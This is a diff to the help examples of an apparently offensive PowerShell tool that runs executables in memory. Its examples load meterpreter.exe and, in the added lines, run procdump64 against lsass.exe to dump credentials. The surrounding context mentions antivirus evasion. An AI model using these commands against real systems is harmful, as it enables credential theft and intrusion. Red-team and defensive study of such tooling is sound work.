@@ -203,12 +203,12 @@ WARNING: Endpoint protection WILL catch malware this way.
 
 .EXAMPLE
 
-Run-Exe 47
+Run-Exe $hubModule
 
 Description
 -----------
 
-Execute the exe module 47 in memory
+Execute some Hub Module of type 'exe' in memory.
 
 .EXAMPLE
 
@@ -217,7 +217,16 @@ Load-HubModule meterpreter.exe | Run-Exe
 Description
 -----------
 
-Load the exe module with the name 'meterpreter.exe' in memory and run it
+Load the exe module with the name 'meterpreter.exe' in memory and run it.
+
+.EXAMPLE
+
+Get-HubModule procdump64 | Run-Exe -ExeArgs "-accepteula -ma lsass.exe lsass.dmp"
+
+Description
+-----------
+
+Run the binary whose name matches 'procdump64' in memory and dump the lsass process.
 #>
     Param(
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
@@ -307,7 +316,7 @@ This might trigger the anti-virus.
 
 .EXAMPLE
 
-Load-HubModule SeatBelt | Run-DotNETExe "system"
+Load-HubModule SeatBelt | Run-DotNETExe -Arguments "system"
 
 Description
 -----------
